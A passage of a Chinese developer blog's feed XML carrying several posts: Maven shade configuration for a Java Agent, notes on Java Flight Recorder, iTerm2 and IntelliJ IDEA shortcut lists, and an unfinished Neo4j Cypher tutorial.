class="name">include</span>&gt;</span>org.javassist:javassist:jar:*<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">artifactSet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="comment">&lt;!-- 修改第三方依赖包名称 --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">relocations</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">relocation</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">shadedPattern</span>&gt;</span>com.fxc.deps.javassist<span class="tag">&lt;/<span class="name">shadedPattern</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">relocation</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">relocations</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h1><ol><li>在打包jar的时候，已经要记得将ASM/javassist打进去，maven-shade-plugin插件。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;空山新雨后，天色晚来秋。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;整理Java Agent相关知识 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="Java Agent" scheme="https://0range228.github.io/tags/Java-Agent/"/>
    
  </entry>
  
  <entry>
    <title>JFR笔记</title>
    <link href="https://0range228.github.io/JFR%E7%AC%94%E8%AE%B0/"/>
    <id>https://0range228.github.io/JFR%E7%AC%94%E8%AE%B0/</id>
    <published>2021-01-20T01:58:30.000Z</published>
    <updated>2021-01-22T09:03:10.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>愿君多采撷，此物最相思。</p></blockquote><p>整理JFR相关知识 。</p><a id="more"></a><h1 id="什么是JFR？"><a href="#什么是JFR？" class="headerlink" title="什么是JFR？"></a>什么是JFR？</h1><p>JFR 是 Java Flight Record （Java飞行记录） 的缩写，是 JVM 内置的基于事件的JDK监控记录框架。这个起名就是参考了黑匣子对于飞机的作用，将Java进程比喻成飞机飞行，==主要用于问题定位和持续监控==。</p><p>JFR性能非常高效，对于业务影响很小，因为这个框架本来就是用来长期在线上部署的框架。这个记录可以输出成二进制文件，用户可以指定最大记录时间，或者最大记录大小，供用户在需要的时候输出成文件进行事后分析。</p><p>JFR 的前身也是 JFR，只不过这个 J 不是 Java 而是 JRockit。在 JRockit 虚拟机时代，就有这样一个工具用来记录 Java 虚拟机运行时各项数据。在 Oracle 收购 Sun 公司之后，Hotspot 虚拟机时代，也一直延续了这个工具：</p><ul><li>JFR 0.9 版本对应 JDK 7 和JDK 8：</li><li>在 JDK 8u40 之后，可以在运行时灵活地打开关闭 JFR。 </li><li>JFR 1.0 版本对应 JDK 9 和 JDK 10： 在这一版本之后，增加了 JFR 事件接口，用户可以生产或者消费某种事件。 </li><li>JFR 2.0 版本对应 JDK 11，详细讨论说明。</li></ul><p>JFR具有以下关键的特性： </p><ul><li><p>低开销，可在生产环境核心业务进程中始终在线运行。</p></li><li><p>可以进行运行时分析，可以分析 Java 应用程序，JVM 内部以及当前Java进程运行环境等多因素。</p></li><li><p>JFR基于事件采集，可以分析非常底层的信息，例如对象分配，方法采样与热点方法定位与调用堆栈，安全点分析与锁占用时长与堆栈分析，GC 相关分析以及 JIT 编译器相关分析（例如 CodeCache ）</p></li><li><p>完善的 API 定义，用户可以自定义事件的生产与消费。</p></li></ul><h1 id="核心-Event事件"><a href="#核心-Event事件" class="headerlink" title="核心-Event事件"></a>核心-Event事件</h1><p>在 JFR中，一切皆为 Event： </p><ul><li>任意JVM行为都是一个Event，类加载对应 Class Load Event </li><li>开启 JFR 记录也是一个Event，对应的就是 Recording Reason Event </li><li>就算是有 Event 丢失，他也是一个 Event，对应 Data Loss Event</li></ul><p>Event 在特定的时间点产生，每个Event是由<strong>名称</strong>，<strong>时间戳</strong>还有 <strong>Event Payload</strong>组成。</p><p>Event Payload包含例如 CPU负载、Event 发生之前还有之后的 Java 堆大小、 获取锁的线程 ID 等等。</p><p>大部分的 Event，都有 Event 是在哪个线程发生的，Event 发生的时候这个线程的调用栈，Event 的持续时间。</p><p>利用这些信息，我们可以回溯 Event 发生当时的情况。</p><h2 id="Event-分类"><a href="#Event-分类" class="headerlink" title="Event 分类"></a>Event 分类</h2><p>Event 按照采集方式可以分为三种：</p><ol><li>Instant Event：顾名思义，这种 Event 在发生时就立刻采集。例如：Throw Exception Event 还有 Thread Start Event，类似于这种==在某一时刻发生的 Event==。</li><li>Duration Event：这种 Event 需要耗费一些时间，在完成的时候会记录。对于这种类型的 Event，可以设置一个时间限制，超过这个时间限制的才会记录。例如 GC Event，Thread Sleep Event。</li><li>Sample Event（Requestable Event）：按照一定的频率采集，这个频率是可以配置的。例如 Thread Dump Event，Method Sampling Event</li></ol><p>由于 JFR 会采集很多很多的数据，为了效率，最好配置自己感兴趣的事件采集；</p><p>对于 Duration Event 设置时间限制，一般我们对于时间短的事件并不关心。</p><p>Event 会被写入 .jfr 的二进制文件（二进制文件对于应用来说读写效率最高）中，以 little endian base 128 的形式编码，这里我们用一个 Event 举个例子：</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;愿君多采撷，此物最相思。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;整理JFR相关知识 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="JFR" scheme="https://0range228.github.io/tags/JFR/"/>
    
  </entry>
  
  <entry>
    <title>iTerm2 快捷键速查手册</title>
    <link href="https://0range228.github.io/iTerm2-%E5%BF%AB%E6%8D%B7%E9%94%AE%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/"/>
    <id>https://0range228.github.io/iTerm2-%E5%BF%AB%E6%8D%B7%E9%94%AE%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/</id>
    <published>2020-12-23T02:33:40.000Z</published>
    <updated>2021-02-09T18:42:26.030Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>终南阴岭秀，积雪浮云端。</p></blockquote><p>整理敲板子过程中的快捷键 。</p><a id="more"></a><h1 id="Tab"><a href="#Tab" class="headerlink" title="Tab"></a>Tab</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">新建标签：command + t</span><br><span class="line"></span><br><span class="line">关闭标签：command + w</span><br><span class="line"></span><br><span class="line">切换标签：command + 数字 / command + 左右方向键</span><br><span class="line"></span><br><span class="line">切换全屏：command + enter</span><br><span class="line"></span><br><span class="line">查找：command + f</span><br></pre></td></tr></table></figure><h1 id="分屏"><a href="#分屏" class="headerlink" title="分屏"></a>分屏</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">垂直分屏：command + d</span><br><span class="line"></span><br><span class="line">水平分屏：command + shift + d</span><br><span class="line"></span><br><span class="line">切换屏幕：command + option + 方向键 / command + [ 或 command + ]</span><br><span class="line"></span><br><span class="line">查看历史命令：command + ;</span><br><span class="line"></span><br><span class="line">查看剪贴板历史：command + shift + h</span><br></pre></td></tr></table></figure><h1 id="文本操作"><a href="#文本操作" class="headerlink" title="文本操作"></a>文本操作</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">清除当前行：ctrl + u</span><br><span class="line"></span><br><span class="line">到行首：ctrl + a</span><br><span class="line"></span><br><span class="line">到行尾：ctrl + e</span><br><span class="line"></span><br><span class="line">按单词移动：option + 左/右 方向键</span><br><span class="line"></span><br><span class="line">上一条命令：ctrl + p</span><br><span class="line"></span><br><span class="line">删除到文本末尾：ctrl + k</span><br><span class="line"></span><br><span class="line">搜索命令历史：ctrl + r</span><br><span class="line"></span><br><span class="line">删除当前光标的字符：ctrl + d</span><br><span class="line"></span><br><span class="line">删除光标之前的字符：ctrl + h</span><br><span class="line"></span><br><span class="line">删除光标之前的单词：ctrl + w</span><br><span class="line"></span><br><span class="line">交换光标处文本：ctrl + t</span><br><span class="line"></span><br><span class="line">清屏1：command + r</span><br><span class="line"></span><br><span class="line">清屏2：ctrl + l</span><br><span class="line"></span><br><span class="line">⌘ + 数字在各 tab 标签直接来回切换</span><br><span class="line"></span><br><span class="line">选择即复制 + 鼠标中键粘贴，这个很实用</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;终南阴岭秀，积雪浮云端。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;整理敲板子过程中的快捷键 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Shell" scheme="https://0range228.github.io/categories/Shell/"/>
    
    
      <category term="iTerm2" scheme="https://0range228.github.io/tags/iTerm2/"/>
    
  </entry>
  
  <entry>
    <title>IDEA 快捷键速查手册</title>
    <link href="https://0range228.github.io/IDEA-%E5%BF%AB%E6%8D%B7%E9%94%AE%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/"/>
    <id>https://0range228.github.io/IDEA-%E5%BF%AB%E6%8D%B7%E9%94%AE%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/</id>
    <published>2020-12-22T09:39:25.000Z</published>
    <updated>2021-03-06T06:06:18.939Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>大漠孤烟直，长河落日圆。</p></blockquote><p>整理敲板子过程中的快捷键 。</p><a id="more"></a><h1 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h1><p>try-catch：cmd+option+t</p><p>查看接口实现：option+cmd+b</p><p>搜索查看，类，api：cmd+o</p><p>函数调用：ctrl+option+h</p><p>自动补全变量：option+command+v</p><p>自动包围代码，例如添加try-catch代码块：option+command+t</p><p>生成注释块：ctrl+shift+/</p><p>生成方法注释：/**+tab</p><p>查看所有方法：command+F12</p><p>查看继承关系：Diagram-&gt;showDiagrams</p><p>搜索：shift+command+F</p><p>格式化代码块：command+option+L</p><p>批量重命名：shift+F6</p><p>中文颜文字：shift+6</p><p>批量编写：ctrl+G       先选中某部分，然后多次ctrl+全选，直接批量编写</p><p>批量框选：option+鼠标左键拖拽  这个逆天了 感觉像画画一样</p><p>整行移动： option+shift+上/下  快速调整代码行顺序 交换位置</p><p>快速显示/隐藏当前方法体 : command + . </p><p>快速概览当前类的所有方法：command + shift + +/-</p><p>统一修改方法签名： command+F6 </p><p>查看历史剪切板： command +shift+  v</p><p>代码抽取：</p><ol><li>抽取为局部变量：command+option+v 将字符串常量提取出来 单独声明</li><li>抽取为成类的成员变量：command+option+F  </li><li>抽取为成类的静态常量：command+option+C</li><li>抽取为方法入参：command+option+P</li><li>抽取为方法：command + option + M</li></ol><p>一些for循环快捷键：</p><p>其实所有for循环都在live templates里面，当然可以自定义：</p><ol><li>iter         <code>for (String arg : args)</code></li><li>itar      Iterate elements of array   <code>for (int j = 0; j &lt; args.length; j++)</code></li><li>itco     Iterate elements of java.util.Collection    <code>for (Iterator iterator = collection.iterator(); iterator.hasNext();)</code></li><li>itit      Iterate java.util.Iterator     <code>while (iterator.hasNext())</code></li><li>itli  Iterate elements of java.util.List <code>for (int j = 0; j &lt; list.size(); j++)</code></li><li>fori           <code>for (int j = 0; j &lt; ; j++)</code></li><li>foreach         <code>for(:)</code></li></ol><p>以上快捷键直接敲就行 不用.的方式去触发。</p><p>IDEA快捷键 自带Postfix</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"Jack"</span>.<span class="keyword">var</span> -&gt; String name = <span class="string">"Jack"</span></span><br><span class="line"></span><br><span class="line">name.notnull / name.nn -&gt; <span class="keyword">if</span>(name != <span class="keyword">null</span>)</span><br><span class="line"></span><br><span class="line">inputStream.close();.<span class="keyword">try</span> -&gt; <span class="keyword">try</span>&amp;<span class="keyword">catch</span></span><br><span class="line"></span><br><span class="line">obj.cast -&gt; (TYPE_TO_CAST)obj</span><br><span class="line"></span><br><span class="line">name.<span class="keyword">if</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> RuntimeException().<span class="keyword">throw</span></span><br><span class="line"></span><br><span class="line">list.<span class="keyword">for</span> / list.fori</span><br><span class="line"></span><br><span class="line">name.soutv -&gt; System.out.Println(<span class="string">"name = "</span>+name);</span><br><span class="line"></span><br><span class="line">name.<span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line"><span class="string">"%d = %d + %d"</span>.format</span><br><span class="line"></span><br><span class="line">psfs -&gt; <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;大漠孤烟直，长河落日圆。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;整理敲板子过程中的快捷键 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="IDE" scheme="https://0range228.github.io/categories/IDE/"/>
    
    
      <category term="IDEA" scheme="https://0range228.github.io/tags/IDEA/"/>
    
  </entry>
  
  <entry>
    <title>Neo4j爬坑记</title>
    <link href="https://0range228.github.io/Neo4j%E7%88%AC%E5%9D%91%E8%AE%B0/"/>
    <id>https://0range228.github.io/Neo4j%E7%88%AC%E5%9D%91%E8%AE%B0/</id>
    <published>2020-12-18T07:35:26.000Z</published>
    <updated>2021-03-05T07:27:12.172Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>一点浩然气，千里快哉风。</p></blockquote><p>今天来记录自己Neo4j实战、爬坑记录。</p><a id="more"></a><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>图数据库只有两点：节点，关系。</p><p>节点node可以类比理解为Java里面的对象实例，关系其实就是edge边信息。</p><h1 id="查询语句CQL：CYPHER"><a href="#查询语句CQL：CYPHER" class="headerlink" title="查询语句CQL：CYPHER"></a>查询语句CQL：CYPHER</h1><p>类似SQL语句一样，在Neo4j里面是使用Cypher语句进行查询。</p><p>Cypher句法由四个不同的部分组成，每一部分都有一个特殊的规则：</p><ul><li><p>start——查找图形中的起始节点。</p></li><li><p>match——匹配图形模式，可以定位感兴趣数据的子图形。</p></li><li><p>where——基于某些标准过滤数据。</p></li><li><p>return——返回感兴趣的结果。</p></li></ul><p>Cypher的模式匹配性质使得图形模式成为任何查询的重点问题。</p><p>常用的Neo4j CQL命令/条款如下：</p><table><thead><tr><th>S.No.</th><th>CQL命令/条</th><th>用法</th></tr></thead><tbody><tr><td>1。</td><td>CREATE 创建</td><td>创建节点，关系和属性</td></tr><tr><td>2。</td><td>MATCH 匹配</td><td>检索有关节点，关系和属性数据</td></tr><tr><td>3。</td><td>RETURN 返回</td><td>返回查询结果</td></tr><tr><td>4。</td><td>WHERE 哪里</td><td>提供条件过滤检索数据</td></tr><tr><td>5。</td><td>DELETE 删除</td><td>删除节点和关系</td></tr><tr><td>6。</td><td>REMOVE 移除</td><td>删除节点和关系的属性</td></tr><tr><td>7。</td><td>ORDER BY以…排序</td><td>排序检索数据</td></tr><tr><td>8。</td><td>SET 组</td><td>添加或更新标签</td></tr></tbody></table><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="CREATE创建"><a href="#CREATE创建" class="headerlink" title="CREATE创建"></a>CREATE创建</h3><p><strong>Neo4j CQL创建一个没有属性的节点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE (&lt;node-name&gt;:&lt;label-name&gt;)  节点名：标签名</span><br></pre></td></tr></table></figure><p><strong>示例</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE (emp:Employee)</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE (:Employee)</span><br></pre></td></tr></table></figure><p><strong>Neo4j CQL创建具有属性的节点</strong></p><p>Neo4j CQL“CREATE”命令用于创建带有属性的节点。 它创建一个具有一些属性（键值对）的节点来存储数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE (</span><br><span class="line">   &lt;node-name&gt;:&lt;label-name&gt;</span><br><span class="line">   &#123;    </span><br><span class="line">      &lt;key&gt;:&lt;Value&gt;</span><br><span class="line">      ........</span><br><span class="line">      &lt;n-key&gt;:&lt;n-Value&gt;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><strong>示例</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE (dept:Dept &#123; deptno:10, dname:&quot;Accounting&quot;, location:&quot;Hyderabad&quot;&#125;)</span><br></pre></td></tr></table></figure><p><strong>创建多个标签到节点</strong></p><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE (&lt;node-name&gt;:&lt;label-name1&gt;:&lt;label-name2&gt;.....:&lt;label-namen&gt;)复制代码</span><br></pre></td></tr></table></figure><p><strong>示例</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE (m:Movie:Cinema:Film:Picture) 一个节点有多个标签</span><br></pre></td></tr></table></figure><h3 id="MATCH查询"><a href="#MATCH查询" class="headerlink" title="MATCH查询"></a>MATCH查询</h3><p>Neo4j CQL MATCH命令用于</p><ul><li>从数据库获取有关节点和属性的数据</li><li>从数据库获取有关节点，关系和属性的数据</li></ul><p>MATCH命令语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MATCH </span><br><span class="line">(</span><br><span class="line">   &lt;node-name&gt;:&lt;label-name&gt;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><strong>示例</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH (dept:Dept)</span><br></pre></td></tr></table></figure><p>但是执行后会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Neo.ClientError.Statement.SyntaxError: </span><br><span class="line">Query cannot conclude with MATCH </span><br><span class="line">(must be RETURN or an update clause) (line 1, column 1 (offset: 0))</span><br></pre></td></tr></table></figure><p>如果你观察到错误消息，它告诉我们，我们可以使用MATCH命令与RETURN子句或UPDATE子句。</p><h3 id="RETURN返回"><a href="#RETURN返回" class="headerlink" title="RETURN返回"></a>RETURN返回</h3><p>Neo4j CQL RETURN子句用于 -</p><ul><li>检索节点的某些属性</li><li>检索节点的所有属性</li><li>检索节点和关联关系的某些属性</li><li>检索节点和关联关系的所有属性</li></ul><p>RETURN命令语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RETURN </span><br><span class="line">   &lt;node-name&gt;.&lt;property1-name&gt;,</span><br><span class="line">   ........</span><br><span class="line">   &lt;node-name&gt;.&lt;propertyn-name&gt;</span><br></pre></td></tr></table></figure><p><strong>示例</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH (e:Employee) RETURN e</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MATCH (dept: Dept)</span><br><span class="line">RETURN dept.deptno,dept.dname,dept.location</span><br></pre></td></tr></table></figure><h3 id="关系基础"><a href="#关系基础" class="headerlink" title="关系基础"></a>关系基础</h3><p>Neo4j图数据库遵循属性图模型来存储和管理其数据。</p><p>根据属性图模型，关系应该是定向的。 否则，Neo4j将抛出一个错误消息。</p><p>基于方向性，Neo4j关系被分为两种主要类型。</p><ul><li>单向关系</li><li>双向关系</li></ul><p><strong>使用新节点创建关系</strong></p><p><strong>示例</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE (e:Employee)-[r:DemoRelation]-&gt;(c:Employee)</span><br></pre></td></tr></table></figure><p>这句会创建节点e，节点c，以及e -&gt; c的关系r，这里需要注意方向，比如双向是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE (e:Employee)&lt;-[r:DemoRelation]-&gt;(c:Employee)</span><br></pre></td></tr></table></figure><p><strong>使用已知节点创建带属性的关系：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MATCH (&lt;node1-label-name&gt;:&lt;node1-name&gt;),(&lt;node2-label-name&gt;:&lt;node2-name&gt;)</span><br><span class="line">CREATE  </span><br><span class="line">    (&lt;node1-label-name&gt;)-[&lt;relationship-label-name&gt;:&lt;relationship-name&gt;</span><br><span class="line">    &#123;&lt;define-properties-list&gt;&#125;]-&gt;(&lt;node2-label-name&gt;)</span><br><span class="line">RETURN &lt;relationship-label-name&gt;</span><br></pre></td></tr></table></figure><blockquote><p>还是一系列键值对</p></blockquote><p><strong>示例</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MATCH (cust:Customer),(cc:CreditCard) </span><br><span class="line">CREATE (cust)-[r:DO_SHOPPING_WITH&#123;shopdate:<span class="string">"12/12/2014"</span>,price:<span class="number">55000</span>&#125;]-&gt;(cc) </span><br><span class="line">RETURN r</span><br></pre></td></tr></table></figure><p><strong>检索关系节点的详细信息：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MATCH </span><br><span class="line">(&lt;node1-label-name&gt;)-[&lt;relationship-label-name&gt;:&lt;relationship-name&gt;]-&gt;(&lt;node2-label-name&gt;)</span><br><span class="line">RETURN &lt;relationship-label-name&gt;</span><br></pre></td></tr></table></figure><p><strong>示例</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MATCH (cust)-[r:DO_SHOPPING_WITH]-&gt;(cc) </span><br><span class="line">RETURN cust,cc</span><br></pre></td></tr></table></figure><h3 id="WHERE子句"><a href="#WHERE子句" class="headerlink" title="WHERE子句"></a>WHERE子句</h3><p>像SQL一样，Neo4j CQL在CQL MATCH命令中提供了WHERE子句来过滤MATCH查询的结果。</p><p><strong>简单WHERE子句语法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE &lt;property-name&gt; &lt;comparison-operator&gt; &lt;value&gt;</span><br></pre></td></tr></table></figure><p>语法说明：</p><table><thead><tr><th>S.No.</th><th>语法元素</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>WHERE</td><td>它是一个Neo4j CQL关键字。</td></tr><tr><td>2</td><td>&lt;属性名称&gt;</td><td>它是节点或关系的属性名称。</td></tr><tr><td>3</td><td>&lt;比较运算符&gt;</td><td>它是Neo4j CQL比较运算符之一。</td></tr><tr><td>4</td><td>&lt;值&gt;</td><td>它是一个字面值，如数字文字，字符串文字等。</td></tr></tbody></table><p><strong>Neo4j CQL中的比较运算符</strong></p><p>Neo4j 支持以下的比较运算符，在 Neo4j CQL WHERE 子句中使用来支持条件</p><table><thead><tr><th>S.No.</th><th>布尔运算符</th><th>描述</th></tr></thead><tbody><tr><td>1.</td><td>=</td><td>它是Neo4j CQL“等于”运算符。</td></tr><tr><td>2.</td><td>&lt;&gt;</td><td>它是一个Neo4j CQL“不等于”运算符。</td></tr><tr><td>3.</td><td>&lt;</td><td>它是一个Neo4j CQL“小于”运算符。</td></tr><tr><td>4.</td><td>&gt;</td><td>它是一个Neo4j CQL“大于”运算符。</td></tr><tr><td>5.</td><td>&lt;=</td><td>它是一个Neo4j CQL“小于或等于”运算符。</td></tr><tr><td>6.</td><td>=</td><td>它是一个Neo4j CQL“大于或等于”运算符。</td></tr></tbody></table><p>我们可以使用布尔运算符在同一命令上放置多个条件。</p><p><strong>Neo4j CQL中的布尔运算符</strong></p><p>Neo4j支持以下布尔运算符在Neo4j CQL WHERE子句中使用以支持多个条件。</p><table><thead><tr><th>S.No.</th><th>布尔运算符</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>AND</td><td>它是一个支持AND操作的Neo4j CQL关键字。</td></tr><tr><td>2</td><td>OR</td><td>它是一个Neo4j CQL关键字来支持OR操作。</td></tr><tr><td>3</td><td>NOT</td><td>它是一个Neo4j CQL关键字支持NOT操作。</td></tr><tr><td>4</td><td>XOR</td><td>它是一个支持XOR操作的Neo4j CQL关键字。</td></tr></tbody></table><p><strong>示例</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MATCH (emp:Employee) </span><br><span class="line">WHERE emp.name = <span class="string">'Abc'</span> OR emp.name = <span class="string">'Xyz'</span></span><br><span class="line">RETURN emp</span><br></pre></td></tr></table></figure><p>利用<code>WHERE</code>创建指定关系节点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MATCH (cust:Customer),(cc:CreditCard) </span><br><span class="line">WHERE cust.id = <span class="string">"1001"</span> AND cc.id= <span class="string">"5001"</span> </span><br><span class="line">CREATE (cust)-[r:DO_SHOPPING_WITH&#123;shopdate:<span class="string">"12/12/2014"</span>,price:<span 